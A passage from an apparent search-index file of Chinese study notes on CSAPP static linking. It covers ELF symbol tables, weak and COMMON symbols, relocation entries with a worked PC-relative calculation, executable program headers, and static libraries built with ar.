weak )); // binding = STB_WEAK, NDX = 4 double y __attribute__ (( common )); // binding = STB_GLOBAL, NDX = COM Rule 2 \u548c Rule 3 \u53ef\u80fd\u5bfc\u81f4\u4e00\u4e9b\u96be\u4ee5\u53d1\u73b0\u7684\u9519\u8bef \u2002 foo.c \u2002 #include <stdio.h> void f ( void ); int x = 1 ; int y = 2 ; int main () { f (); printf ( \"x = 0x%x, y = 0x%x \\n \" , x , y ); return 0 ; } \u2002 bar.c \u2002 double y __attribute__ (( common )); void f () { y = -0.0 ; } \u2002 run \u2002 $ gcc -Og -o foobar foo.c bar.c $ ./foobar x = 0x80000000, y = 0x0 3. \u91cd\u5b9a\u4f4d \ud83e\uddd0 (1). \u91cd\u5b9a\u4f4d\u8868 \ud83e\uddd0 /* Relocation table entry with addend (in section of type SHT_RELA). */ typedef struct { Elf64_Addr r_offset ; /* Address */ Elf64_Xword r_info ; /* Relocation type and symbol index */ Elf64_Sxword r_addend ; /* Addend */ } Elf64_Rela ; \u5404\u6210\u5458\u7684\u542b\u4e49: r_offset : \u5bf9\u4e8e relocatable file\uff0c\u503c\u4e3a\u8981\u4fee\u6b63\u4f4d\u7f6e\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u5bf9\u4e8e\u6bb5\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5bf9\u4e8e execuable / shared file\uff0c\u503c\u4e3a\u8981\u4fee\u6b63\u4f4d\u7f6e\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u865a\u62df\u5730\u5740 r_info :\u2002 \u4f4e 8 \u4f4d\u8868\u793a\u91cd\u5b9a\u4f4d\u6761\u76ee\u7684\u7c7b\u578b\uff0c\u9ad8 24 \u4f4d\u8868\u793a\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684 index r_addend :\u2002 \u6709\u7b26\u53f7\u5e38\u6570\uff0c\u4e00\u4e9b\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9700\u8981\u7528\u5b83\u4f5c\u8c03\u6574 ELF \u5b9a\u4e49\u4e86 32 \u79cd\u91cd\u5b9a\u4f4d\u7c7b\u578b\uff0c\u53ea\u5173\u5fc3\u6700\u57fa\u672c\u7684\u4e24\u79cd: R_X86_64_PC32 :\u2002 Relocate a reference that uses a 32-bit PC-relative address R_X86_64_32 :\u2002 Relocate a reference that uses a 32-bit absolute address. \u8fd9\u4e24\u79cd\u7c7b\u578b\u652f\u6301 x86-64 \u5c0f\u578b\u4ee3\u7801\u6a21\u578b (\u5047\u8bbe\u4ee3\u7801\u548c\u6570\u636e\u5c0f\u4e8e 2G, gcc default)\uff0c\u5927\u578b\u7a0b\u5e8f\u53ef\u7528 -mcmodel=medium/large \u7f16\u8bd1 (2). \u91cd\u5b9a\u4f4d\u7b26\u53f7\u7684\u5f15\u7528 \ud83e\uddd0 \u7531 Elf64_Rela \u7684\u5b9a\u4e49\uff0c\u5047\u8bbe\u6bcf\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee\u6709 offset, symbol, type, addend 4 \u4e2a\u5c5e\u6027 example main.c int sum ( int * a , int n ); int array [ 2 ] = { 1 , 2 }; int main () { int val = sum ( array , 2 ); return val ; } sum.c int sum ( int * a , int n ) { int i , s = 0 ; for ( i = 0 ; i < n ; ++ i ) { s += a [ i ]; } return s ; } objdump -dx main.o (assumption) 0000000000000000 < main > : 0: 48 83 ec 08 sub $0x8 , %rsp 4: be 02 00 00 00 mov $0x2 , %esi 9: bf 00 00 00 00 mov $0x0 , %edi # %edi = &array a: R_X86_64_32 array e: e8 00 00 00 00 callq 13 f: R_X86_64_PC32 sum-0x4 13: 48 83 c4 08 add $0x8 , %rsp 17: c3 retq \u5047\u8bbe s.ADDR = ADDR(.text) = 0x4004d0 \uff0c r.symbol.ADDR = ADDR(sum) = 0x4004e8 \uff0c\u8ba1\u7b97\u8fc7\u7a0b: r . offset = 0xf r . type = R_X86_64_PC32 r . symbol = sum r . addend = -4 refAddr = s . ADDR + r . offset = 0x4004d0 + 0xf = 0x4004df * refPtr = ( unsigned ) ( 0x4004e8 + ( -4 ) - 0x4004df ) = ( unsigned ) ( 0x5 ) ----------------------- result : ----------------------- 4004 de : e8 05 00 00 00 callq 4004e8 < sum > 4004e3 : ... \u89e3\u91ca: \u91cd\u5b9a\u4f4d\u4ee3\u7801\u6bb5\u4e2d\u7684\u5f15\u7528\u524d\uff0c\u786e\u5b9a\u4e86 .text \u5730\u5740 0x4004d0 \uff0c sum \u5730\u5740 0x4004e8 \u7531 .text \u5730\u5740\u52a0\u504f\u79fb ( r.offset )\uff0c\u786e\u5b9a\u586b\u7a7a e8 __ 00 00 00 callq 13 <sum> \u7684\u5730\u5740 0x4004df *(0x4004df) = x \uff0c\u7531\u4e8e\u662f PC \u76f8\u5bf9\u5bfb\u5740\uff0c\u5148 0x4004df + 4 \u83b7\u5f97\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x4004e3 \uff0c\u7136\u540e\u51cf\u53bb\u51fd\u6570\u5730\u5740 x = 0x4004e3 - 0x4004e8 = 0x5 4. \u53ef\u6267\u884c\u6587\u4ef6 \ud83e\uddd0 \u2003 \u2003 \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u548c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u76f8\u4f3c: \u591a\u4e86\u4e00\u4e2a\u6bb5\u5934\u90e8\u8868\uff0c\u7d22\u5f15\u4e86\u8fd0\u884c\u65f6\u6240\u9700\u7684\u6bb5 \u5df2\u7ecf\u94fe\u63a5\u597d\uff0c\u65e0\u9700\u91cd\u5b9a\u4f4d\u8282 .rel._ example test.c int array [ 1000 ]; int main () { int b = array [ 0 ]; } view segment header table of test $ gcc test.c -no-pie -o test $ readelf -l test Elf \u6587\u4ef6\u7c7b\u578b\u4e3a EXEC (\u53ef\u6267\u884c\u6587\u4ef6) Entry point 0x401020 There are 13 program headers, starting at offset 64 \u7a0b\u5e8f\u5934\uff1a Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000400318 0x0000000000400318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000550 0x0000000000000550 R 0x1000 LOAD 0x0000000000001000 0x0000000000401000 0x0000000000401000 0x00000000000001a5 0x00000000000001a5 R E 0x1000 LOAD 0x0000000000002000 0x0000000000402000 0x0000000000402000 0x00000000000000f8 0x00000000000000f8 R 0x1000 LOAD 0x0000000000002e40 0x0000000000403e40 0x0000000000403e40 0x00000000000001e8 0x00000000000011c0 RW 0x1000 DYNAMIC 0x0000000000002e50 0x0000000000403e50 0x0000000000403e50 0x0000000000000190 0x0000000000000190 RW 0x8 NOTE 0x0000000000000338 0x0000000000400338 0x0000000000400338 0x0000000000000040 0x0000000000000040 R 0x8 ... Section to Segment mapping: \u6bb5\u8282... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn 03 .init .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .got.plt .data .bss 06 .dynamic 07 .note.gnu.property ... \u6ce8\u610f\u9700\u8981\u5173\u95ed\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u968f\u673a\u5316 -no-pie \u3002 FileSiz \u4ee3\u8868\u76ee\u6807\u6587\u4ef6\u7684\u8282\u5927\u5c0f\uff0c MemSiz \u4ee3\u8868\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6bb5\u5927\u5c0f\u3002\u7531\u6700\u540e\u4e00\u4e2a LOAD \uff0c\u53ef\u4ee5\u77e5\u9053\u53ef\u6267\u884c\u6587\u4ef6\u4e2d .bss \u653e\u5728\u6570\u636e\u6bb5\u6700\u540e\u4e14\u4e0d\u5360\u5185\u5b58\u7684\u539f\u56e0\u3002 5. \u548c\u9759\u6001\u5e93\u94fe\u63a5 \ud83e\uddd0 \u6240\u6709\u7684\u7f16\u8bd1\u7cfb\u7edf\u90fd\u652f\u6301\u628a\u591a\u4e2a\u76ee\u6807\u6a21\u5757\u6253\u5305\u6210\u4e00\u4e2a static library\uff0c\u5982\u679c\u6ca1\u6709\u9759\u6001\u5e93: \u7f16\u8bd1\u5668\u6839\u636e\u5e93\u51fd\u6570\u540d\u751f\u6210\u4ee3\u7801\uff0c\u8fd9\u56de\u52a0\u5927\u7f16\u8bd1\u5668\u7684\u590d\u6742\u5ea6\uff0c\u4e14\u4e0d\u597d\u7ef4\u62a4 \u628a\u6240\u6709\u76ee\u6807\u6a21\u5757\u7f16\u8bd1\u6210\u4e00\u4e2a\uff0c\u6d6a\u8d39\u7a7a\u95f4\uff0c\u4e0d\u597d\u7ef4\u62a4 \u9759\u6001\u5e93\u805a\u5408\u4e86\u591a\u4e2a\u6a21\u5757\uff0c\u5728\u94fe\u63a5\u65f6\uff0c\u94fe\u63a5\u5668\u53ea\u590d\u5236\u88ab\u7a0b\u5e8f\u5f15\u7528\u7684\u6a21\u5757\uff0c\u4e22\u5f03\u5176\u4ed6\u6a21\u5757\u3002\u5b9e\u9645\u4e0a\uff0cC \u7f16\u8bd1\u5668\u9ed8\u8ba4\u4f20\u9001 libc.a \u7ed9\u94fe\u63a5\u5668\u3002 (1). \u793a\u4f8b \ud83e\uddd0 addvec.c int addcnt = 0 ; void addvec ( int * x , int * y , int * z , int n ) { int i ; addcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] + y [ i ]; } multvec.c int multcnt = 0 ; void multvec ( int * x , int * y , int * z , int n ) { int i ; multcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] * y [ i ]; } main.c #include <stdio.h> #include \"vector.h\" int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); return 0 ; } vector.h void addvec ( int * , int * , int * , int ); void multvec ( int * , int * , int * , int ); generate and use libvector.a $ gcc -c addvec.c multvec.c $ ar rcs libvector.a addvec.o multvec.o $ gcc -c main.c $ gcc -static -o prog main.o ./libvector.a $ ./prog z = [4 6] (2). \u9759\u6001\u5e93\u89e3\u6790\u5f15\u7528 \ud83e\uddd0 Linux linker \u7ef4\u62a4\u4e00\u4e2a relocatable files \u96c6\u5408 $E$\uff0c\u672a\u89e3\u6790\u7684\u7b26\u53f7\u96c6\u5408 $U$\uff0c\u5df2\u6210\u529f\u89e3\u6790\u7b26\u53f7\u96c6\u5408 $D$\uff1b\u7136\u540e\u4ece\u5de6\u5411\u53f3\u5bf9\u76ee\u6807\u6587\u4ef6 $f_i$ \u8fdb\u884c\u7b26\u53f7\u89e3\u6790: $f_i$ \u662f\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6:\u2002 linker \u628a $f$ \u52a0\u5165 $E$\uff0clinker \u5c1d\u8bd5\u5339\u914d $U$ \u4e2d\u672a\u89e3\u6790\u7b26\u53f7 \u4ee5\u53ca $f_i$ \u5b9a\u4e49\u7684\u7b26\u53f7 $f_i$ \u662f\u4e00\u4e2a\u5b58\u6863\u6587\u4ef6:\u2002 \u904d\u5386\u6210\u5458\uff0c\u5982\u679c $f_i$ \u7684\u67d0\u4e2a\u6210\u5458 $m$ \u5b9a\u4e49\u7684\u7b26\u53f7\u89e3\u6790\u4e86 $U$ \u4e2d\u7684\u4e00\u4e2a\u5f15\u7528\uff0c\u5c31\u5c06 $m$ \u52a0\u5165 $E$ \u89e3\u6790\u7ed3\u675f\u540e\uff0c$U$ \u975e\u7a7a\u5219\u62a5\u9519\u3002\u8fd9\u79cd\u65b9\u5f0f\u8981\u6c42\u5f15\u7528\u53d8\u91cf\u7684\u6a21\u5757\u5728\u524d\u9762\uff0c\u56e0\u6b64\u9700\u8981\u6ce8\u610f: \u5e93\u4e00\u822c\u653e\u5728\u547d\u4ee4\u884c\u7ed3\u5c3e \u5982\u679c\u5e93\u4e4b\u95f4\u4e0d\u662f\u76f8\u4e92\u72ec\u7acb\u7684\uff0c\u8fd8\u8981\u5bf9\u5b83\u4eec\u8fdb\u884c\u5408\u9002\u7684\u6392\u5e8f","title":"2. static linking"},{"location":"_csapp/_Link/stlink/#1","text":"\u7b26\u53f7\u89e3\u6790: \u2002 \u5173\u8054\u8de8\u6a21\u5757\u7b26\u53f7\u7684\u5f15\u7528\u548c\u5b9a\u4e49\uff0c\u4e3a\u91cd\u5b9a\u4f4d\u4f5c\u94fa\u57ab \u91cd\u5b9a\u4f4d: \u6a21\u5757\u7f16\u8bd1\u751f\u6210 _.o \u65f6\uff0c\u7531\u4e8e\u4e0d\u77e5\u9053\u8fd0\u884c\u65f6\u7684\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u5730\u5740\uff0c\u6a21\u5757\u5185\u6bcf\u5f15\u7528\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7 (\u81ea\u5df1\u5b9a\u4e49\u7684\u4e5f\u7b97)\uff0c\u5c31\u751f\u6210\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee .rel._ (\u5148\u7559\u5751\u5e76\u5b58\u70b9\u6709\u6548\u4fe1\u606f\uff0c\u7b49\u586b) \u94fe\u63a5\u65f6\uff0c\u5148\u5408\u5e76\u6240\u6709\u7684\u8282\uff0c\u7136\u540e\u628a\u5730\u5740\u8d4b\u7ed9\u6bcf\u4e2a\u5408\u5e76\u540e\u7684\u8282\u3001\u8f93\u5165\u6a21\u5757\u5b9a\u4e49\u7684\u6240\u6709\u7b26\u53f7\uff0c\u6b64\u65f6\u91cd\u5b9a\u4f4d\u4fe1\u606f\u5df2\u7ecf\u5b8c\u6574 (\u8282\u5730\u5740\u3001\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u90fd\u77e5\u9053\u4e86)\uff0c\u6839\u636e\u91cd\u5b9a\u4f4d\u6761\u76ee\u6267\u884c\u91cd\u5b9a\u4f4d","title":"1. \u9759\u6001\u94fe\u63a5\u8fc7\u7a0b"},{"location":"_csapp/_Link/stlink/#2","text":"","title":"2. \u7b26\u53f7\u89e3\u6790"},{"location":"_csapp/_Link/stlink/#1_1","text":".symtab \u662f Elf64_Sym \u7684\u6570\u7ec4\uff0c\u5176\u6210\u5458\u5982\u4e0b typedef struct { Elf64_Word st_name ; /* Symbol name (string tbl index) */ unsigned char st_info ; /* Symbol type and binding */ unsigned char st_other ; /* Symbol visibility */ Elf64_Section st_shndx ; /* Section index */ Elf64_Addr st_value ; /* Symbol value */ Elf64_Xword st_size ; /* Symbol size */ } Elf64_Sym ; meaning of members st_name : \u2002 \u7b26\u53f7\u540d\uff0c\u5305\u542b\u4e86\u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u7684\u4e0b\u6807 st_value : \u2002 \u7b26\u53f7\u503c\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u6587\u4ef6\uff0c\u5176\u503c\u4ee3\u8868\u8fd0\u884c\u65f6\u5730\u5740\uff1b\u5bf9\u4e8e\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e14 shndx \u6709\u6548\u7684\u6761\u76ee\uff0c\u5176\u503c\u4ee3\u8868\u6bb5\u504f\u79fb st_size : \u2002 \u7b26\u53f7\u5927\u5c0f\uff0c\u4f8b\u5982 double \u578b\u7684\u7b26\u53f7\u5360 8 \u5b57\u8282 st_info : \u2002 \u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u4f4e 4 \u4f4d\u662f symbol type\uff0c\u9ad8 28 \u4f4d\u662f symbol binding st_other : \u2002 \u4e3a 0, \u6ca1\u7528 st_shndx : \u2002 \u7b26\u53f7\u6240\u5728\u7684\u6bb5\u3002\u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u6b64\u6210\u5458\u8868\u793a\u7b26\u53f7\u6240\u5728\u7684\u6bb5\u5728\u6bb5\u8868\u4e2d\u7684\u4e0b\u6807\uff0c\u5426\u5219\u4e3a\u7279\u6b8a\u503c st_info (symbol type) macro value description STT_NOTYPE 0 \u672a\u77e5\u7c7b\u578b\u7b26\u53f7 STT_OBJECT 1 \u6570\u636e\u5bf9\u8c61\uff0c\u4f8b\u5982 \u53d8\u91cf\u3001\u6570\u7ec4 STT_FUNC 2 \u51fd\u6570\u6216\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801 STT_SECTION 3 \u4e00\u4e2a\u6bb5\uff0c\u4e00\u5b9a\u662f\u662f STB_LOCAL STT_FILE 4 \u6587\u4ef6\u540d\uff0c\u4e00\u5b9a\u662f STB_LOCAL \uff0c st_shndx \u4e00\u5b9a\u662f SHN_ABS st_info (symbol binding) macro value description STB_LOCAL 0 \u5c40\u90e8\u7b26\u53f7\uff0c\u6587\u4ef6\u5916\u4e0d\u53ef\u89c1 STB_GLOBAL 1 \u5168\u5c40\u5f3a\u7b26\u53f7 STB_WEAK 2 \u5f31\u7b26\u53f7 st_shndx (special value) macro value description SHN_ABS 0xfff1 \u8868\u793a\u8be5\u7b26\u53f7\u5305\u542b\u4e86\u4e00\u4e2a\u7edd\u5bf9\u7684\u503c SHN_COMMON 0xfff2 COMMON \u7c7b\u578b\u7684\u7b26\u53f7 SHN_UNDEF 0 \u8868\u793a\u8be5\u7b26\u53f7\u672a\u5b9a\u4e49 (\u672c\u6587\u4ef6\u5f15\u7528\uff0c\u5176\u4ed6\u6587\u4ef6\u5b9a\u4e49)","title":"(1). \u7b26\u53f7\u8868"},{"location":"_csapp/_Link/stlink/#2_1","text":"\u6bcf\u4e2a\u76ee\u6807\u6a21\u5757\u90fd\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u5728 linker \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6709\u4e09\u79cd\u7b26\u53f7: \u672c\u6a21\u5757\u5b9a\u4e49\u7684\u5168\u5c40\u7b26\u53f7 (\u975e\u9759\u6001\u51fd\u6570 \u548c \u5168\u5c40\u53d8\u91cf) \u5176\u4ed6\u6a21\u5757\u5b9a\u4e49, \u88ab\u672c\u6a21\u5757\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7 \u53ea\u88ab\u672c\u6a21\u5757\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5c40\u90e8\u7b26\u53f7 (\u9759\u6001\u51fd\u6570 \u548c \u9759\u6001\u5168\u5c40\u53d8\u91cf) \u7f16\u8bd1\u65f6\uff0c\u7f16\u8bd1\u5668\u5411\u6c47\u7f16\u5668\u8f93\u51fa\u5168\u5c40\u7b26\u53f7\u53ca\u5176\u5f3a\u5f31\u4fe1\u606f\uff0c\u6c47\u7f16\u5668\u628a\u8fd9\u4e2a\u4fe1\u606f\u7f16\u7801\u5728\u7b26\u53f7\u8868\u4e2d strong: \u2002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6a21\u5757\u4e2d\u6240\u6709\u7b26\u53f7\u90fd\u662f\u5f3a\u7b26\u53f7 weak: \u2002 \u9700\u8981\u989d\u5916\u5b9a\u4e49 Linux \u94fe\u63a5\u5668\u6784\u9020\u5168\u5c40\u7b26\u53f7\u8868\uff0c\u6839\u636e\u5982\u4e0b\u89c4\u5219\u5904\u7406\u591a\u91cd\u5b9a\u4e49\u7684\u7b26\u53f7: Rule 1: \u2002 \u4e0d\u5141\u8bb8\u6709\u591a\u4e2a\u540c\u540d\u7684\u5f3a\u7b26\u53f7 Rule 2: \u2002 \u5982\u679c\u6709\u4e00\u4e2a\u5f3a\u7b26\u53f7\u548c\u591a\u4e2a\u5f31\u7b26\u53f7\u540c\u540d\uff0c\u9009\u62e9\u5f3a\u7b26\u53f7 Rule 3: \u2002 \u5982\u679c\u6709\u591a\u4e2a\u5f31\u7b26\u53f7\u540c\u540d\uff0c\u4ece\u4e2d\u4efb\u9009\u4e00\u4e2a C static C static \u53d8\u91cf\u4f7f\u7528\u7684\u573a\u666f \u5e0c\u671b\u67d0\u4e2a\u5168\u5c40\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u6a21\u5757\u53ef\u8bbf\u95ee \u51fd\u6570\u5e0c\u671b\u4f7f\u7528\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u7559\u72b6\u6001\u7684\u5c40\u90e8\u53d8\u91cf (\u4e0d\u5728\u6808\u4e0a)\uff0c\u53c8\u4e0d\u5e0c\u671b\u5168\u5c40\u8bbf\u95ee static \u53d8\u91cf\u9700\u8981 .bss \u6216 .data \u4e0a\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u653e\u5728 .symtab \u4e2d\u3002\u4f46\u4e0d\u540c\u51fd\u6570\u53ef\u80fd\u5b9a\u4e49\u540c\u540d\u7684\u5c40\u90e8\u9759\u6001\u53d8\u91cf\uff0c\u7b26\u53f7\u8868\u901a\u5e38\u4ee5 x.0 , x.1 \u7684\u65b9\u5f0f\u533a\u5206 int f () { static int a = 10 ; } int g () { static int a = 20 ; } // readelf -s __.o : a.0, a.1 \u5f31\u7b26\u53f7\u673a\u5236\u7684\u4f5c\u7528 \u5f53\u524d\u6a21\u5757\u9700\u8981\u8c03\u8bd5\uff0c\u800c\u5176\u4ed6\u76f8\u5173\u6a21\u5757\u8fd8\u672a\u5b9e\u73b0\uff0c\u5148\u5b9a\u4e49\u5f31\u53d8\u91cf\u6216\u5f31\u51fd\u6570\u8fdb\u884c\u8c03\u8bd5 \u5e93\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u5b9a\u4e49\u4e3a\u5f31\u7b26\u53f7\uff0c\u652f\u6301\u4f7f\u7528\u8005\u8986\u76d6 COMMON\u2002mechanism \u5bf9\u4e8e\u5f31\u7b26\u53f7\uff0c\u53ef\u4ee5 binding = weak, ndx = .bss \uff0c\u4e5f\u53ef\u4ee5 binding = global, ndx = COM \uff0c\u540e\u8005\u76f8\u5f53\u4e8e common \u5c31\u662f\u5f31\u6807\u8bb0\uff0c\u5728\u5408\u6210\u53ef\u6267\u884c\u6587\u4ef6\u65f6\u90fd\u53ef\u4ee5\u89e3\u6790\uff0c\u53d6\u51b3\u4e8e\u5177\u4f53\u5b9e\u73b0 COMMON \u6bb5\u548c .bss \u529f\u80fd\u6709\u70b9\u50cf\uff0c\u4f46 COMMON \u7684\u521d\u8877\u662f\u89e3\u51b3\u5f31\u7b26\u53f7\u91cd\u540d\uff0c\u7eaf\u662f\u5386\u53f2\u539f\u56e0 here /* test with gcc 10.2 & readelf */ double x __attribute__ (( weak )); // binding = STB_WEAK, NDX = 4 double y __attribute__ (( common )); // binding = STB_GLOBAL, NDX = COM Rule 2 \u548c Rule 3 \u53ef\u80fd\u5bfc\u81f4\u4e00\u4e9b\u96be\u4ee5\u53d1\u73b0\u7684\u9519\u8bef \u2002 foo.c \u2002 #include <stdio.h> void f ( void ); int x = 1 ; int y = 2 ; int main () { f (); printf ( \"x = 0x%x, y = 0x%x \\n \" , x , y ); return 0 ; } \u2002 bar.c \u2002 double y __attribute__ (( common )); void f () { y = -0.0 ; } \u2002 run \u2002 $ gcc -Og -o foobar foo.c bar.c $ ./foobar x = 0x80000000, y = 0x0","title":"(2). \u7b26\u53f7\u5206\u7c7b\u4e0e\u7ed1\u5b9a"},{"location":"_csapp/_Link/stlink/#3","text":"","title":"3. \u91cd\u5b9a\u4f4d"},{"location":"_csapp/_Link/stlink/#1_2","text":"/* Relocation table entry with addend (in section of type SHT_RELA). */ typedef struct { Elf64_Addr r_offset ; /* Address */ Elf64_Xword r_info ; /* Relocation type and symbol index */ Elf64_Sxword r_addend ; /* Addend */ } Elf64_Rela ; \u5404\u6210\u5458\u7684\u542b\u4e49: r_offset : \u5bf9\u4e8e relocatable file\uff0c\u503c\u4e3a\u8981\u4fee\u6b63\u4f4d\u7f6e\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u5bf9\u4e8e\u6bb5\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5bf9\u4e8e execuable / shared file\uff0c\u503c\u4e3a\u8981\u4fee\u6b63\u4f4d\u7f6e\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u865a\u62df\u5730\u5740 r_info :\u2002 \u4f4e 8 \u4f4d\u8868\u793a\u91cd\u5b9a\u4f4d\u6761\u76ee\u7684\u7c7b\u578b\uff0c\u9ad8 24 \u4f4d\u8868\u793a\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684 index r_addend :\u2002 \u6709\u7b26\u53f7\u5e38\u6570\uff0c\u4e00\u4e9b\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9700\u8981\u7528\u5b83\u4f5c\u8c03\u6574 ELF \u5b9a\u4e49\u4e86 32 \u79cd\u91cd\u5b9a\u4f4d\u7c7b\u578b\uff0c\u53ea\u5173\u5fc3\u6700\u57fa\u672c\u7684\u4e24\u79cd: R_X86_64_PC32 :\u2002 Relocate a reference that uses a 32-bit PC-relative address R_X86_64_32 :\u2002 Relocate a reference that uses a 32-bit absolute address. \u8fd9\u4e24\u79cd\u7c7b\u578b\u652f\u6301 x86-64 \u5c0f\u578b\u4ee3\u7801\u6a21\u578b (\u5047\u8bbe\u4ee3\u7801\u548c\u6570\u636e\u5c0f\u4e8e 2G, gcc default)\uff0c\u5927\u578b\u7a0b\u5e8f\u53ef\u7528 -mcmodel=medium/large \u7f16\u8bd1","title":"(1). \u91cd\u5b9a\u4f4d\u8868"},{"location":"_csapp/_Link/stlink/#2_2","text":"\u7531 Elf64_Rela \u7684\u5b9a\u4e49\uff0c\u5047\u8bbe\u6bcf\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee\u6709 offset, symbol, type, addend 4 \u4e2a\u5c5e\u6027 example main.c int sum ( int * a , int n ); int array [ 2 ] = { 1 , 2 }; int main () { int val = sum ( array , 2 ); return val ; } sum.c int sum ( int * a , int n ) { int i , s = 0 ; for ( i = 0 ; i < n ; ++ i ) { s += a [ i ]; } return s ; } objdump -dx main.o (assumption) 0000000000000000 < main > : 0: 48 83 ec 08 sub $0x8 , %rsp 4: be 02 00 00 00 mov $0x2 , %esi 9: bf 00 00 00 00 mov $0x0 , %edi # %edi = &array a: R_X86_64_32 array e: e8 00 00 00 00 callq 13 f: R_X86_64_PC32 sum-0x4 13: 48 83 c4 08 add $0x8 , %rsp 17: c3 retq \u5047\u8bbe s.ADDR = ADDR(.text) = 0x4004d0 \uff0c r.symbol.ADDR = ADDR(sum) = 0x4004e8 \uff0c\u8ba1\u7b97\u8fc7\u7a0b: r . offset = 0xf r . type = R_X86_64_PC32 r . symbol = sum r . addend = -4 refAddr = s . ADDR + r . offset = 0x4004d0 + 0xf = 0x4004df * refPtr = ( unsigned ) ( 0x4004e8 + ( -4 ) - 0x4004df ) = ( unsigned ) ( 0x5 ) ----------------------- result : ----------------------- 4004 de : e8 05 00 00 00 callq 4004e8 < sum > 4004e3 : ... \u89e3\u91ca: \u91cd\u5b9a\u4f4d\u4ee3\u7801\u6bb5\u4e2d\u7684\u5f15\u7528\u524d\uff0c\u786e\u5b9a\u4e86 .text \u5730\u5740 0x4004d0 \uff0c sum \u5730\u5740 0x4004e8 \u7531 .text \u5730\u5740\u52a0\u504f\u79fb ( r.offset )\uff0c\u786e\u5b9a\u586b\u7a7a e8 __ 00 00 00 callq 13 <sum> \u7684\u5730\u5740 0x4004df *(0x4004df) = x \uff0c\u7531\u4e8e\u662f PC \u76f8\u5bf9\u5bfb\u5740\uff0c\u5148 0x4004df + 4 \u83b7\u5f97\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x4004e3 \uff0c\u7136\u540e\u51cf\u53bb\u51fd\u6570\u5730\u5740 x = 0x4004e3 - 0x4004e8 = 0x5","title":"(2). \u91cd\u5b9a\u4f4d\u7b26\u53f7\u7684\u5f15\u7528"},{"location":"_csapp/_Link/stlink/#4","text":"\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u548c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u76f8\u4f3c: \u591a\u4e86\u4e00\u4e2a\u6bb5\u5934\u90e8\u8868\uff0c\u7d22\u5f15\u4e86\u8fd0\u884c\u65f6\u6240\u9700\u7684\u6bb5 \u5df2\u7ecf\u94fe\u63a5\u597d\uff0c\u65e0\u9700\u91cd\u5b9a\u4f4d\u8282 .rel._ example test.c int array [ 1000 ]; int main () { int b = array [ 0 ]; } view segment header table of test $ gcc test.c -no-pie -o test $ readelf -l test Elf \u6587\u4ef6\u7c7b\u578b\u4e3a EXEC (\u53ef\u6267\u884c\u6587\u4ef6) Entry point 0x401020 There are 13 program headers, starting at offset 64 \u7a0b\u5e8f\u5934\uff1a Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000400318 0x0000000000400318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000550 